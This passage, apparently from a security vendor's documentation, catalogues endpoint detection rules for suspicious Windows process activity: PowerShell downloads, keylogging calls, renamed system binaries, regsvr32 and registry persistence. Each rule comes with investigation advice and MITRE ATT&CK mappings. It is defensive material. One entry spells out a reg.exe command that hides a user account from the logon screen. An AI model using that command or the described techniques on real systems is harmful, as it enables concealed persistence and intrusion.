This detection identifies PowerShell being used to look up a DNS TXT record. TXT records can be used by attacks to contain C2 information for malware.

#### Recommendation

Investigate the contents of the TXT records being queried. Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- DNS - T1071.004


</details>



<details>
<summary>Suspicious Process - PowerShell Downloads Executable</summary>



#### Description

This detection identifies executable files downloaded by PowerShell using the DownloadFile function. Malicious actors will often use this to download second stage payloads.

#### Recommendation

Investigate the URL being contacted and the file downloaded from it. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - PowerShell Editing Persistence-Related Registry Key</summary>



#### Description

This detection identifies PowerShell using the Set-Itemproperty function to modify the contents of the UserInit registry key. This may be done by a malicious actor to achieve persistence on a system. 

#### Recommendation

Investigate the modified registry key. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Winlogon Helper DLL - T1547.004


</details>



<details>
<summary>Suspicious Process - PowerShell Executes RunDLL32</summary>



#### Description

This detection identifies RunDLL32.exe being executed by PowerShell. A malicious actor may abuse RunDLL32 to execute a malicious DLL file. 

#### Recommendation

Investigate the DLL being executed by RunDLL32. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - PowerShell Executing [IO.File] Object </summary>



#### Description

This detection identified PowerShell executing a script from disk using an [IO.File] object. This may be done by malicious actors to load additional malware from a file on disk.

#### Recommendation

Investigate the file that is being read from. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell GetAsyncKeyState</summary>



#### Description

This detection identifies the GetAsyncKeyState function being used in PowerShell. Malicious actors may use this function as part of a keylogger.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. Attempt to determine what the PowerShell script is doing with the data gathered by GetAsyncKeyState. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Keylogging - T1056.001
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Get Clipboard Content</summary>



#### Description

This detection identifies the use of [Windows.Clipboard]::GetText in PowerShell, which has been used by PowerShell-based backdoors, such as Empire to acquire the contents of a target user's clipboard.

#### Recommendation

Determine what else is done by the PowerShell script being executed, and if it is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Clipboard Data - T1115


</details>



<details>
<summary>Suspicious Process - Powershell GetHostAddresses Get-Random</summary>



#### Description

This detection identifies the use of Powershell's Get-Random cmdlet to randomize domain and subdomain names. This has been observed in use by malicious actors, in generating C2 hostnames to circumvent Network defense tools that rely on domain name blocking.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Implant PowerLess Backdoor</summary>



#### Description

This detection identifies execution of 'powerless' spawned by a PowerShell command. 'Powerless' is a privilege escalation backdoor used by malicious actors to perform enumeration.

#### Recommendation

Investigate the command that is being executed. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Privilege Escalation - T1068


</details>



<details>
<summary>Suspicious Process - PowerShell Interacting with Outlook via COM Object</summary>



#### Description

This detection identifies PowerShell interacting with Outlook by using the Outlook.Application COM Object. A malicious actor may do this to perform information gathering on the contents of a user's mailboxes.   

#### Recommendation

Investigate the PowerShell command being run. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Local Email Collection - T1114.001


</details>



<details>
<summary>Suspicious Process - Powershell Invoke-WebRequest</summary>



#### Description

This detection identifies the use of Invoke-WebRequest being passed to PowerShell in the command line in order to retrieve data from a remote system for later execution.

#### Recommendation

Review the file being retrieved and the process history of the host in order to identify other attacker related activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - PowerShell IO.MemoryStream</summary>



#### Description

This detection identifies interaction with MemoryStream objects in PowerShell. A MemoryStream object is a stream of bytes stored in memory. Malicious actors use MemoryStreams objects to store non-printable code, such as shellcode or portable executable files. 

#### Recommendation

Analyze the PowerShell command for suspicious contents. There may be data in the command that is encoded using base64, gzip, or other means. Attempt to reverse any obfuscation to further investigate what the command is doing. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Keylogger Drive-by Pattern</summary>



#### Description

This detection identifies the execution of 'PowerShell.exe' passing specific arguments indicative of a drive-by keylogger campaign wherein a Windows App is dropped to disk and spawns this script behavior.  The Windows App binary is commonly copied to the local users directory and is invoked via SilentCleanup UAC bypass.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Keylogging - T1056.001
- PowerShell - T1059.001
- Drive-by Compromise - T1189
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Suspicious Process - PowerShell OpenRead to Remote PNG File</summary>



#### Description

This detection identifies PowerShell using the OpenRead() function to download a remote PNG image file. This activity is observed in Invoke-PSImage, a tool used to obfuscate PowerShell code by storing it in a PNG file. 

#### Recommendation

Investigate the URL or IP address being contacted. Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Pushes Group Policy Update to All Systems</summary>



#### Description

This detection identifies PowerShell being used to push a Group Policy update to all systems found in Active Directory. Ransomware, in particular the LockBit ransomware, has been observed doing this in order to disable Windows Defender across the environment. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. Ensure that the change in group policy is rolled back. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Suspicious Process - PowerShell Reflection.Assembly</summary>



#### Description

This detection identifies use of the Reflection.Assembly class in PowerShell. Reflection.Assembly class can be used by attackers to perform reflective DLL injection and cause a malicious DLL to execute in-memory.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell SAPS</summary>



#### Description

This detection identifies the string ‘SAPS’ being passed to PowerShell. ‘SAPS’ is an alias for the PowerShell Start-Process Cmdlet. This attack vector is used by malicious actors, but not common.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Setting or Using $windowsupdate Variable</summary>



#### Description

This detection identifies PowerShell setting or using the variable $windowsupdate. This variable is consistently used by the QBot family of malware. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Sort-Object Get-Random</summary>



#### Description

This detection identifies the use of encoded PowerShell payloads in Base64, and the reordering of the encoded string using the ‘Sort-Object’ and ‘Get-Random’ cmdlets. At runtime, the string is passed to the ‘Sort-Object’ function, which sorts the objects according to a pre-seeded random number generator. The resulting output is the valid Base64.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Suspicious Process - PowerShell Spawned By ForFiles</summary>



#### Description

This detection identifies PowerShell as a child process of ForFiles.exe. This has been observed in use by malicious, who will use ForFiles.exe to cause a specific PowerShell command to be run on a batch of files.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Spawning .NET Binary</summary>



#### Description

This detection identifies ‘PowerShell.exe’ with commonly malicious arguments spawning a .NET Framework binary.  This technique is typically used for process hollowing and injection by malicious actors in multistage malware.

#### Recommendation

Review the parent and child processes in question. If it is malicious, quarantine the asset, lock the user's account, and reset the credentials.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Spawns Binary In Users\Public\Documents</summary>



#### Description

This detection identifies ‘PowerShell.exe’ spawning any process when the process binary is located in the ‘Users\Public\Documents’ directory. Malicious actors use this writable directory to save and execute malware retrieved by downloaders.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell Spawns RunDLL32 With UserProfile</summary>



#### Description

This detection identifies execution of '.dll' files from a users profile by 'rundll32.exe' spawned by 'powershell.exe'. This technique is used by malicious actors in order to proxy the execution of malicious code through a known and trusted binary.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - PowerShell Spawns WScript Running File Out Of Temp Folder</summary>



#### Description

This detection identifies ‘PowerShell.exe’ spawning ‘WScript.exe’, which reads a file from a temporary directory. This technique is used by malicious actors to drop banking trojans.

#### Recommendation

Review the process in question. If it is malicious, quarantine the asset, lock the user's account, and reset the credentials.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Visual Basic - T1059.005
- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - PowerShell Start-BitsTransfer Followed By Execution</summary>



#### Description

This detection identifies PowerShell using Background Intelligent Transfer Service (BITS) related functions to download and execute a payload. Malicious actors may use BITS as a way to download additional malware or tools. 

#### Recommendation

Investigate the file downloaded by BITS and the URL from which it was downloaded. Examine the parent process that spawned the PowerShell session, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- BITS Jobs - T1197


</details>



<details>
<summary>Suspicious Process - PowerShell System.Net.Sockets.TcpClient </summary>



#### Description

This detection identifies the use of the PowerShell System.Net.Sockets.TcpClient module, often used by attackers to create TCP connections for C2 purposes.

#### Recommendation

Investigate any IP addresses identified in the command. Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Application Layer Protocol - T1071


</details>



<details>
<summary>Suspicious Process - PowerShell Uncommon Upper And Lower Case Combinations</summary>



#### Description

This detection identifies ‘PowerShell.exe’ being called with suspicious combinations of upper and lower case characters. Malicious actors use this technique embedded within malicious documents. When the document is opened, it will spawn PowerShell as ‘poWErSHeLl.exe’ or in another similar form that users do not enter.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - PowerShell With BitsTransfer</summary>



#### Description

This detection identifies the use of the PowerShell.exe with the BitsTransfer function in the command line. This is often used by malicious documents in order to perform the transfer of the payload to the endpoint for later execution.

#### Recommendation

Review the file being downloaded and the URL being contacted. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- BITS Jobs - T1197


</details>



<details>
<summary>Suspicious Process - Process Executed From live.sysinternals.com</summary>



#### Description

This detection identifies processes being executed directly from live.sysinternals.com. SysInternals hosts a collection of tools used by administrators and sometimes malicious actors.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - Process From Users Directory Spawns SchTasks</summary>



#### Description

This detection identifies scheduled tasks that are attempting to be created and called from locations that are writable by the user.

#### Recommendation

Determine whether this is part of authorized administrator activity. Analyze the contents of the task being created. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005


</details>



<details>
<summary>Suspicious Process - Process Spawned By Outlook Web Access</summary>



#### Description

This detection identifies processes spawned by Microsoft IIS processes that have been configured to serve as Outlook Web Access web servers for Microsoft Exchange. Rogue processes being spawned may be an indication of a successful attack against these systems and has been observed targeted by various malicious actors.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having any possibly effected uses change their passwords. 

#### MITRE ATT&CK Techniques

- Exploit Public-Facing Application - T1190
- Server Software Component - T1505
- Web Shell - T1505.003


</details>



<details>
<summary>Suspicious Process - Process Spawned By SAPStartSrv</summary>



#### Description

This detection identifies processes spawned by 'sapstartsrv.exe' from SAP's NetWeaver. Malicious actors could use this to create web application accounts on vulnerable systems and execute commands under the context of a privileged user.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Privilege Escalation - T1068
- Exploitation for Client Execution - T1203


</details>



<details>
<summary>Suspicious Process - Python Downloading and Executing Script</summary>



#### Description

This detection identifies Python being used to download and execute a script from a remote destination. This may be done by malware attempting to download and execute second stage payloads. 

#### Recommendation

Investigate the contents of the URL that the script was downloaded from. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Python - T1059.006
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - RegASM.exe in Non-Standard Location</summary>



#### Description

This detection identifies 'RegASM.exe', the Microsoft .NET Assembly Registration Utility, being run from an unusual directory. Malicious actors have been identified bringing their own copy of 'RegASM.exe' or making a copy of the version on the system in order to register malicious assemblies or inject code into 'RegASM.exe'. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Regsvcs/Regasm - T1218.009


</details>



<details>
<summary>Suspicious Process - RegASM Spawns Process</summary>



#### Description

This detection identifies RegASM.exe spawning a subprocess. This may be indicative of process injection or a signed binary proxy execution.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- Signed Binary Proxy Execution - T1218
- Regsvcs/Regasm - T1218.009


</details>



<details>
<summary>Suspicious Process - Regedit.exe Silently Imports File from Temp Directory</summary>



#### Description

This detection identifies RegEdit being used to import a registry file from the Temp directory. Malicious actors have been observed importing registry keys as a method of maintaniing persistence. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Modify Registry - T1112
- Registry Run Keys / Startup Folder - T1547.001


</details>



<details>
<summary>Suspicious Process - Reg.exe Adding GlobalFlag Key</summary>



#### Description

This detection identifies the use of reg.exe to set globalflags on images as a method of persistence.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Modify Registry - T1112


</details>



<details>
<summary>Suspicious Process - Reg.exe Deleting Word or Excel Resiliency Keys</summary>



#### Description

This detection identifies malware deleting keys in the \Word\Resiliency or \Excel\Resiliency registry key. A registry  key that is often deleted is DisabledItems. By deleting this key, any disabled add-ins will be re-enabled. This tactic is used by the malicious PowerWorm PowerShell module for generating malicious documents. 

#### Recommendation

Determine whether there is a legitimate reason for the parent process to delete this key. Look for any suspicious behavior associated with Word or Excel, and investigate any child processes they may have spawned.

#### MITRE ATT&CK Techniques

- Modify Registry - T1112


</details>



<details>
<summary>Suspicious Process - Reg.exe Editing Startup Folder Location</summary>



#### Description

This detection identifies the 'Reg.exe' utility being used to modify the contents of the Startup registry key located at HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders. Any folder designated as a startup folder will execute its contents on boot, and malicious actors may do this to achieve persistence. 

#### Recommendation

Investigate the contents of the folder that was set as the new Startup folder. Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Modify Registry - T1112
- Registry Run Keys / Startup Folder - T1547.001


</details>



<details>
<summary>Suspicious Process - Reg.exe Querying Terminal Server Client\Default Key</summary>



#### Description

This detection identifies ‘Reg.exe’ being used to query the registry key, HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default. Querying this key will produce a list of historical connections made from the Remote Desktop client. Malicious actors can use this information to identify targets for lateral movement.

#### Recommendation

Determine whether the user querying the key had a legitimate reason for doing so. Investigate any RDP activity to or from the host in the time frame surrounding the command being run. The source or destination hosts from any RDP activity should also be investigated for any signs of suspicious activity.

#### MITRE ATT&CK Techniques

- Query Registry - T1012
- Remote System Discovery - T1018


</details>



<details>
<summary>Suspicious Process - Reg.exe Used to Hide Account from Logon Screen</summary>



#### Description

This detection identifies the registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList being edited to hide a user from the user list on the logon screen. The command will look similar to:
reg.exe ADD 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v <Username> /t REG_DWORD /d 0 /f
Malicious actors may do this so that accounts they create remain hidden from view. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. Investigate the user account that is being hidden and ensure it is an account that is authorized to be on the system. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Modify Registry - T1112
- Hidden Users - T1564.002


</details>



<details>
<summary>Suspicious Process - Registry Export to Users Directory</summary>



#### Description

This detection identifies registry exports of entire hives to a user’s directory with the ‘Reg.exe’ command. This tactic is used by the LaZagne credential extraction tool.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Determine if this was behavior was part of any authorized security-related activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- Unsecured Credentials - T1552
- Credentials in Registry - T1552.002


</details>



<details>
<summary>Suspicious Process - Regsvr32.exe Registering DLL in ProgramData</summary>



#### Description

This detection identifies DLLs being registered by ‘Regsvr32.exe’ from the ProgramData directory. RegSvr32 is used by malicious actors to execute malicious DLL files. ProgramData is a common staging directory for these files. 

#### Recommendation

Identify the parent process of ‘Regsvr32.exe’. If the registered file is still on disk, acquire it and analyze it. It may be a DLL, or it may be an XML file using the .dll extension. If it is an XML file, it can be analyzed in a plain text editor to determine its purpose. If it is a DLL, the malicious export will be called ServiceMain. If the parent is ‘svchost.exe’, investigate services on the system to identify which one may have launched it and when it was created. 

#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - Regsvr32.exe Registering DLL Outside of Program Files or Windows Directories</summary>



#### Description

This detection identifies DLLs being registered by ‘Regsvr32.exe’ from the ProgramData directory. RegSvr32 is used by malicious actors to execute malicious DLL files.

#### Recommendation

Identify the parent process of ‘Regsvr32.exe’. If the registered file is still on disk, acquire it and analyze it. It may be a DLL, or it may be an XML file using the .dll extension. If it is an XML file, it can be analyzed in a plain text editor to determine its purpose. If the parent is ‘svchost.exe’, investigate services on the system to identify which one may have launched it and when it was created.


#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - RegSvr32 Loads Silently From ProgramData</summary>



#### Description

This detection identifies suspicious use of regsvr32 to load DLLs out of the ProgramData directory. This has been observed in use by malicious actors.


#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - RegSvr32 Spawns Cmd, CScript, PowerShell, SchTasks, WScript</summary>



#### Description

This detection identifies suspicious child processes of RegSvr32.exe. 

#### Recommendation

Determine whether this is part of authorized administrator activity. Examine the child commands being executed. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - regsvr32 with /s /i flags and no dll</summary>



#### Description

This detection identifies certain RegSvr32 flags being used without a DLL in the command line. This may be indicative of a malicious COM object being executed. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - Remote Scheduled Task Created With at.exe</summary>



#### Description

This detection identifies use of the deprecated Windows 'at.exe' task scheduler to schedule a task on a remote system. This utility is often used by malicious actors to remotely execute code.

#### Recommendation

Investigate the target host for any activity following this command. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- SMB/Windows Admin Shares - T1021.002
- Scheduled Task - T1053.005


</details>



<details>
<summary>Suspicious Process - Remote Service Creation</summary>



#### Description

This detection identifies a user creating a service on a remote system. This can be done by malicious actors to move laterally.

#### Recommendation

Investigate the target host for any activity following this command. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Remote Services - T1021
- Service Execution - T1569.002


</details>



<details>
<summary>Suspicious Process - Renamed BITSAdmin</summary>



#### Description

This detection identifies renamed copies of 'BITSAdmin.exe'. Malicious actors have been observed using renamed copies of 'BITSAdmin.exe' - either brought with them into the environment or copied from the 'BITSAdmin.exe' binary already present on the system - to download malicious code and evade defenses. 

#### Recommendation

Examine any binaries downloaded by the renamed 'BITSAdmin.exe'. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- BITS Jobs - T1197


</details>



<details>
<summary>Suspicious Process - Renamed CertUtil</summary>



#### Description

This detection identifies renamed copies of CertUtil. Malicious actors have been observed using renamed copies of CertUtil - either brought with them into the environment or copied from the PowerShell binary already present on the system - to download malicious code and evade defenses. 

#### Recommendation

Investigate any URLs that appear in the command line. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - Renamed CMD.exe</summary>



#### Description

This detection identifies CMD.exe binaries with a different name. Malicious actors may make a copy of CMD.exe elsewhere on the system in order to evade defenses.

#### Recommendation

Investigate any commands run by the renamed CMD.exe. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Command and Scripting Interpreter - T1059
- Windows Command Shell - T1059.003


</details>



<details>
<summary>Suspicious Process - Renamed Microsoft.Workflow.Compiler.exe</summary>



#### Description

This detection identifies Microsoft.Workflow.Compiler.exe executing under a different name. Microsoft.Workflow.Compiler.exe can be used to execute arbitrary code stored in an XOML file.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Rename System Utilities - T1036.003
- Trusted Developer Utilities Proxy Execution - T1127


</details>



<details>
<summary>Suspicious Process - Renamed MSBuild.exe</summary>



#### Description

This detection identifies arguments consistent with MSBuild.exe being used with an executable that is not named MSBuild. This has been observed in malicious activity and used to compile malicious C# payloads. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Compile After Delivery - T1027.004
- MSBuild - T1127.001


</details>



<details>
<summary>Suspicious Process - Renamed Netcat</summary>



#### Description

This detection identifies renamed instances of Netcat, a tool used to read and write from network sockets that is frequently abused by malicious actors.

#### Recommendation

Investigate any URLs or IP addresses contacted, as well as any child processes of Netcat. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Suspicious Process - Renamed PowerShell</summary>



#### Description

This detection identifies renamed copies of PowerShell. Malicious actors have been observed using renamed copies of PowerShell - either brought with them into the environment or copied from the PowerShell binary already present on the system - to execute malicious code and evade defenses. 

#### Recommendation

Examine any commands run by the renamed PowerShell. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - Renamed Process Hacker</summary>



#### Description

This detection identifies the Process Hacker utility running under a different name. Process Hacker is a general purpose system monitoring tool for Windows that has been observed in use by attackers for system reconnaissance.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Process Discovery - T1057


</details>



<details>
<summary>Suspicious Process - Renamed PSExec</summary>



#### Description

This detection identifies renamed copies of the Sysinternals tools, PsExec and PsExecSVC. Malicious actors often use PSExec for lateral movement, and will rename the file to evade detection.

#### Recommendation

investigate the host being targeted or process being spawned by PSExec. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Rename System Utilities - T1036.003


</details>



<details>
<summary>Suspicious Process - Renamed rc.exe</summary>



#### Description

This detection identifies renamed copies of RC.exe, the Microsoft Resource Compiler utility, being run. RC.exe is a popular target for DLL load order hijacking, and attackers may use it to load a malicious version of the file rcdll.dll.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Acquire the file rcdll.dll and analyze it, if capable, or search for its hash on Virus Total. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- DLL Search Order Hijacking - T1574.001


</details>



<details>
<summary>Suspicious Process - Renamed RegSvr32</summary>



#### Description

This detection identifies renamed copies of RegSvr32.exe. Malicious actors have been observed using renamed copies of RegSvr32.exe - either brought with them into the environment or copied from the RegSvr32 binary already present on the system - to execute code from malicious DLL files. 

#### Recommendation

Examine any child processes of the renamed RegSvr32.exe. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - Renamed RegSvr32.exe Registering COM Object</summary>



#### Description

This detection identifies scrobj.dll activity, which is indicative of a Squibblydoo-style application whitelisting bypass being performed by processes not named ‘RegSvr32.exe’. Malicious actors may rename legitimate utilities in an attempt to remain undetected. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - Renamed RunDLL32</summary>



#### Description

This detection identifies renamed copies of RunDLL32.exe. Malicious actors have been observed using renamed copies of RunDll32.exe - either brought with them into the environment or copied from the RunDll32 binary already present on the system - to execute code from malicious libraries. 

#### Recommendation

Examine any child processes of or DLLs loaded by the renamed RunDLL32.exe If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Rundll32 - T1218.011


</details>



<details>
